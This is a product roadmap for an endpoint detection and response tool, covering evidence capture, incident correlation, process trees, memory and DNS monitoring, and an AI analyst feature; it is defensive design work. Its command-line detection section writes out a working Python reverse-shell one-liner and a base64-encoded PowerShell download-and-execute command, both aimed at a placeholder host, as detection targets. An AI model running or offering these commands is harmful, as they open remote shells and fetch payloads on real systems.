# Project AEGIS — CTO Roadmap v2.0

**Lead Architect:** ETCHERO / Abdul-Hameed  
**Classification:** AEGIS-STRATEGIC  
**Last Updated:** July 22, 2026

---

## Where We Are Now

| Version | Stage | Status |
|---|---|---|
| Original | Simple network monitor (SYN scan detector) | ✅ Complete |
| Firewall refactor | Host IDS with iptables + simulation | ✅ Complete |
| Heartbeat + reasoning | Intelligent HIDS with health scoring | ✅ Complete |
| **Phase 1** | **Early autonomous endpoint defense platform** | ✅ **Complete** |
| Phase 2+ | Mature EDR with forensic-grade capabilities | 🔜 Current |

**Current classification:** Early-stage Endpoint Detection and Response (EDR) platform with AI-assisted reasoning.

---

## The Mindset Shift

> Stop thinking like Python programmers...  
> Start thinking like cybersecurity engineers.

Every decision from here should answer: *"Does this make AEGIS more useful to a SOC analyst during an active incident?"*

---

## Priority 1 — Evidence Engine 🔥

### Current state
```
Reverse shell detected
```

### Target state
```
Reverse Shell
├── Process Tree (PID → PPID → Grandparent)
├── Hashes (SHA-256 of binary)
├── Command Line (full argv)
├── User / Environment
├── Working Directory
├── Open Files / Handles
├── Network Connections (local + remote)
└── Memory Regions (if possible)
```

**Every alert must become a forensic artifact.** Not just a notification — a complete evidence package that an analyst can act on immediately.

**Implementation:**
- Extend `ProcessThreat` and all threat dataclasses to carry rich evidence
- When a threat fires, snapshot the full process context automatically
- Persist evidence to disk as structured JSON for later analysis

---

## Priority 2 — Incident Manager 🧩

### Current state
Five separate alerts for one attack chain.

### Target state
```
INCIDENT #AEGIS-2026-0715-003
├── 09:14 — Port Scan (Recon)
├── 09:15 — SSH Brute Force (Initial Access)
├── 09:16 — Privilege Escalation
├── 09:17 — Persistence (Registry Run Key)
├── 09:18 — Reverse Shell (C2)
└── Status: ACTIVE — Auto-blocked IP 185.x.x.x
```

**Correlate related events into incidents** using:
- Source IP correlation
- Process lineage correlation
- Temporal proximity (configurable window)
- MITRE ATT&CK chain mapping

---

## Priority 3 — Process Tree 🌳

### Current
```
Suspicious process chain detected
```

### Target
```
explorer.exe (PID 1234)
└── powershell.exe (PID 5678)
    └── python.exe (PID 9012)
        └── cmd.exe (PID 3456)
            └── nc.exe (PID 7890) — REVERSE SHELL
```

**The process tree tells analysts more than CPU usage ever will.** Every threat must include the full ancestral chain from the current process back to a known root (init, explorer, launchd, etc.).

---

## Priority 4 — Command Line Detection 🧠

### Current
```
python.exe detected
```

### Target
```
python -c "import socket,subprocess;s=socket.socket();s.connect(('185.x.x.x',4444));subprocess.call(['/bin/sh','-i'])"
                                                                                 └── REVERSE SHELL (HIGH confidence)
powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgB4AC4AeAAuAHgALwBwAGEAeQBsAG8AYQBkACcAKQA=
                                                                                 └── ENCODED DOWNLOAD (CRITICAL confidence)
```

**Detect:**
- Base64/hex encoded commands
- `curl | bash` / `wget | sh` patterns
- Reverse shell one-liners
- Download + execute chains
- Beaconing intervals in command repetition

---

## Priority 5 — Memory Intelligence 💾

### Detection targets
- DLL injection (CreateRemoteThread, SetWindowsHookEx)
- Reflective DLL loading
- RWX memory regions (executable heap, process hollowing)
- APC injection
- Process hollowing / herpaderping

**This is difficult but incredibly valuable.** Even basic memory scanning would put AEGIS ahead of most open-source EDR tools.

---

## Priority 6 — DNS Monitoring 🌐

Most malware talks over DNS because it's rarely blocked.

### Watch for
- TXT record queries (common C2 channel)
- High-entropy domain names (DGA detection)
- Beaconing patterns (regular intervals)
- DNS tunneling (abnormal query sizes/frequencies)
- Domain generation algorithm (DGA) detection via entropy + consonant/vowel ratio

---

## Priority 7 — AI Security Analyst 🤖

**This should become AEGIS's signature feature.**

### Current
```
Threat Score: 82
```

### Target
```
AEGIS Assessment
├── A Python process launched PowerShell,
│   downloaded a payload from 185.x.x.x,
│   created registry persistence,
│   and opened an outbound encrypted connection.
├── Confidence: HIGH
├── MITRE ATT&CK:
│   ├── T1059 — Command and Scripting Interpreter
│   ├── T1105 — Ingress Tool Transfer
│   └── T1547 — Boot or Logon Autostart Execution
└── Recommended Action: Isolate host immediately.
```

**That is genuinely useful.** Not a score — an explanation with context, confidence, and recommended action.

---

## Priority 8 — Multi-Platform Backend 🏗️

### Today
| Platform | Firewall |
|---|---|
| Linux | iptables |
| Windows | Simulation only |

### Tomorrow
| Platform | Firewall |
|---|---|
| Linux | iptables + nftables |
| Windows | Windows Filtering Platform (WFP) |
| macOS | pf (Packet Filter) |

**One interface. Multiple implementations.** The firewall abstraction layer should support all three platforms natively.

---

## Priority 9 — Central Dashboard 🖥️

### Target
```
┌─────────────────────────────────────────────┐
│           AEGIS Console                      │
├─────────────────────────────────────────────┤
│  Health     98%     Threats    2            │
│  Endpoints  47      Incidents  4            │
│                                             │
│  Top Attacker    185.31.x.x                 │
│  Last Alert      Reverse Shell              │
│  MITRE           T1059                      │
│                                             │
│  [Live Feed] [Incidents] [Endpoints] [Logs] │
└─────────────────────────────────────────────┘
```

Built with:
- Next.js / React
- WebSocket for real-time
- Tailwind CSS
- Deployable as a single binary with embedded UI

---

## Priority 10 — Agent Mesh (Long-term) 🔄

### Current architecture
```
One monolithic process → all modules
```

### Target architecture
```
Supervisor
│
├── Network Agent
├── Process Agent
├── File Agent
├── Login Agent
├── Memory Agent
├── AI Analyst Agent
└── Response Agent
```

**Each agent runs as an independent process.** This is the architecture used by mature endpoint security products because it provides:
- Fault isolation (one agent crash doesn't take down the system)
- Independent scaling (memory agent can use more resources)
- Hot-swappable components
- Language-agnostic agents (Rust agent for performance, Python agent for rapid iteration)

---

## CTO Execution Order

Here's how I'd sequence this — and **why**:

| Order | Priority | Why This Order |
|---|---|---|
| **1** | Evidence Engine | Without evidence, nothing else matters. Every alert is useless without forensic context. |
| **2** | Incident Manager | Alert correlation is the #1 driver of analyst productivity. Reduces noise immediately. |
| **3** | Process Tree | The single most valuable forensic artifact. Enables better incident correlation too. |
| **4** | Command Line Detection | Catches what process name matching misses. Huge detection improvement for minimal code. |
| **5** | AI Analyst | The signature feature. Makes AEGIS distinctive. Requires good evidence + process tree first. |
| **6** | Dashboard | Makes everything visible. Essential for adoption but not for detection capability. |
| **7** | Memory Intelligence | High difficulty, high reward. Should be pursued once core detection is mature. |
| **8** | DNS Monitoring | Fills a critical detection gap that most malware exploits. |
| **9** | Multi-Platform | Necessary for enterprise deployment but can be parallelized with other work. |
| **10** | Agent Mesh | Long-term architectural evolution. Premature optimization until v3.0. |

## CTO Verdict

If we execute this roadmap well, AEGIS would move beyond being "another security tool" and become an **autonomous security assistant** capable of:

- **Detecting** threats that most tools miss (memory, DNS, command line)
- **Explaining** them in plain language with MITRE context
- **Correlating** them into actionable incidents
- **Recommending** responses with confidence scoring
- **Evolving** as the threat landscape changes

Many products can detect events. Far fewer can **explain**, **correlate**, and **recommend** in a way that meaningfully reduces the workload on administrators.

**That is the goal.**
